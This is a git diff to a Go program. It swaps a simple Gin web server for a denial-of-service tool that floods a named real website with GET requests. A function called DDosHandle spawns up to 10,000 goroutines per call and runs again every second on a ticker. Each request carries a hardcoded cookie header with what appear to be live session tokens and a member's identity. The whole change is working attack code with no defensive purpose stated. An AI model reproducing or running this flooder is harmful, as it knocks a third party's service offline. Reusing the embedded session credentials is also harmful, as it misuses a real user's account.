@@ -1,53 +1,74 @@
 package main
 
 import (
+	"fmt"
+	"gin_reay/bootstrapt"
 	"github.com/gin-gonic/gin"
-	"golang.org/x/sync/errgroup"
-	"log"
-	"os"
-	"os/signal"
+	log "github.com/xiaomi-tc/log15"
+	"io"
+	"net/http"
 	"time"
 )
 
+const RequestUrl = "https://www.52shici.com/index.php"
+
 func main() {
-	g := gin.Default()
 
-	g.GET("/", func(c *gin.Context) {
-		c.JSON(200, gin.H{
-			"message": "Hello, World!",
-		})
+	r := gin.Default()
+
+	//初始化日志
+	bootstrapt.InitLog()
+
+	r.GET("/ddosIndex", func(context *gin.Context) {
+		go DDosHandle(10000)
 	})
-
-	// ... 添加你的路由配置 ...
-
-	// 创建一个errgroup来管理goroutine
-	var eg errgroup.Group
-
-	// 启动HTTP服务器
-	eg.Go(func() error {
-		return g.Run(":8080") // 你的监听端口
-	})
-
-	// 监听退出信号
-	quit := make(chan os.Signal)
-	signal.Notify(quit, os.Interrupt)
-
-	// 当收到信号时，等待所有请求处理完成
-	<-quit
-	log.Println("Shutting down server...")
-
-	// 设置超时，确保在一定时间内关闭
-	timeout := time.Second * 10
-	ctx, cancel := context.WithTimeout(context.Background(), timeout)
-	defer cancel()
-
-	// 优雅关闭HTTP服务器
-	if err := g.Shutdown(ctx); err != nil {
-		log.Printf("Could not gracefully shutdown the server: %v\n", err)
+	tick := time.NewTicker(time.Second * 1)
+	for range tick.C {
+		fmt.Println("ticker start...")
+		DDosHandle(1000)
+		fmt.Println("ticker end...")
 	}
 
-	// 等待所有goroutine完成
-	if err := eg.Wait(); err != nil {
-		log.Fatal(err)
+	// 启动服务器
+	err := r.Run(":8080")
+	if err != nil {
+		return
 	}
+}
+
+func DDosHandle(number int) {
+	for i := 0; i <= number; i++ {
+		go HttpRequestGet()
+	}
+}
+
+func HttpRequestGet() {
+	client := &http.Client{}
+	// 创建一个新的http GET请求
+	req, err := http.NewRequest("GET", RequestUrl, nil)
+	req.Header.Set("Cookie", "last_login_type=wx; PHPSESSID=d5d7868cbbdba243355509dd42fe6520; autoLogin=yes; mem_token=2a2ae09566c029cb2b18a3fd50c96b9b; mem_id=149936; mem_name=%E9%98%BF%E7%99%BD190925")
+	if err != nil {
+		fmt.Println(err.Error())
+		return
+	}
+
+	// 发起请求
+	resp, err := client.Do(req)
+	if err != nil {
+		fmt.Println(err.Error())
+		return
+	}
+	defer func(Body io.ReadCloser) {
+		err := Body.Close()
+		if err != nil {
+		}
+	}(resp.Body)
+
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		fmt.Println(err.Error())
+		return
+	}
+	log.Info("edu", "status", resp.Status, "ContentLength", resp.ContentLength, "bodyLength", len(string(body)))
+	return
 }
